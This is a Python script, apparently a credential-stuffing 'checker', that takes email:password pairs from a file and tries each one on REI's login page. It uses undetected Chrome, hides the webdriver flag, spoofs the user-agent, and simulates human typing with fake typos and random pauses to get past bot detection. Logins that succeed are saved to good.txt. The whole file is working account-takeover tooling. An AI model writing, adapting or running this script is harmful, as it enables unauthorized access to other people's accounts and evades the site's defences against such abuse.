import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import random
import json
import os
from datetime import datetime

# Configuration
ACCOUNTS_FILE = 'accounts.txt'
RESUME_FILE = 'resume.json'
GOOD_FILE = 'good.txt'
SCREENSHOT_DIR = 'screenshots'
DELAY_MIN = 5
DELAY_MAX = 10
TYPE_DELAY_MIN = 0.1
TYPE_DELAY_MAX = 0.3
MISTAKE_CHANCE = 0.05  # 5% chance to make a typo

# Ensure screenshot directory exists
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

def human_type(element, text):
    """Simulate human typing with delays and occasional mistakes."""
    for char in text:
        if random.random() < MISTAKE_CHANCE:
            # Type a random wrong char, then backspace
            wrong_char = random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
            element.send_keys(wrong_char)
            time.sleep(random.uniform(0.5, 1.0))
            element.send_keys('\b')  # Backspace
            time.sleep(random.uniform(0.2, 0.5))
        element.send_keys(char)
        time.sleep(random.uniform(TYPE_DELAY_MIN, TYPE_DELAY_MAX))

def load_accounts():
    """Load accounts from accounts.txt."""
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"Error: {ACCOUNTS_FILE} not found.")
        return []
    with open(ACCOUNTS_FILE, 'r') as f:
        accounts = [line.strip().split(':') for line in f if ':' in line]
    return accounts

def load_resume():
    """Load resume state."""
    if os.path.exists(RESUME_FILE):
        with open(RESUME_FILE, 'r') as f:
            return json.load(f)
    return {'last_index': 0}

def save_resume(index):
    """Save resume state."""
    with open(RESUME_FILE, 'w') as f:
        json.dump({'last_index': index}, f)

def take_screenshot(driver, filename):
    """Take a screenshot and save it."""
    timestamp = int(time.time())
    path = os.path.join(SCREENSHOT_DIR, f"{filename}_{timestamp}.png")
    driver.save_screenshot(path)
    print(f"Screenshot saved: {path}")

def check_login(driver, email, password):
    """Attempt to login and check success."""
    try:
        # Go to homepage
        driver.get("https://www.rei.com/")
        time.sleep(random.uniform(2, 4))

        # Simulate human behavior: scroll a bit
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight / 4);")
        time.sleep(random.uniform(1, 2))

        # Click Sign In
        sign_in_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.LINK_TEXT, "Sign In"))
        )
        sign_in_button.click()
        time.sleep(random.uniform(2, 4))

        # Wait for login form
        email_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))  # Assuming ID; adjust if needed
        )

        # Type email
        human_type(email_field, email)
        time.sleep(random.uniform(0.5, 1.5))

        # Type password
        password_field = driver.find_element(By.ID, "password")  # Assuming ID; adjust if needed
        human_type(password_field, password)
        time.sleep(random.uniform(0.5, 1.5))

        # Submit
        submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")  # Adjust selector
        submit_button.click()
        time.sleep(random.uniform(3, 6))

        # Check success: e.g., if redirected to account page or specific element present
        # This is a placeholder; inspect REI's post-login page for accurate check
        if "account" in driver.current_url.lower() or driver.find_elements(By.CLASS_NAME, "account-welcome"):
            return True  # LIVE
        else:
            return False  # DIE or BLOCK

    except Exception as e:
        print(f"Error during login check: {e}")
        take_screenshot(driver, "error")
        return False

def main():
    accounts = load_accounts()
    if not accounts:
        return

    resume = load_resume()
    start_index = resume['last_index']

    # Setup undetected Chrome
    options = uc.ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument(f"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
    # Add more anti-detect options as needed

    driver = uc.Chrome(options=options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    try:
        for i in range(start_index, len(accounts)):
            email, password = accounts[i]
            print(f"Checking account {i+1}/{len(accounts)}: {email}")

            success = check_login(driver, email, password)

            if success:
                with open(GOOD_FILE, 'a') as f:
                    f.write(f"{email}:{password}\n")
                print("LIVE")
            else:
                print("DIE or BLOCK")
                take_screenshot(driver, "blocked")

            # Random delay between accounts
            delay = random.uniform(DELAY_MIN, DELAY_MAX)
            print(f"Waiting {delay:.2f} seconds...")
            time.sleep(delay)

            # Save resume
            save_resume(i + 1)

    except KeyboardInterrupt:
        print("Interrupted. Saving resume...")
        save_resume(i)
    except Exception as e:
        print(f"Unexpected error: {e}")
        save_resume(i)
    finally:
        driver.quit()

if __name__ == "__main__":
    main()
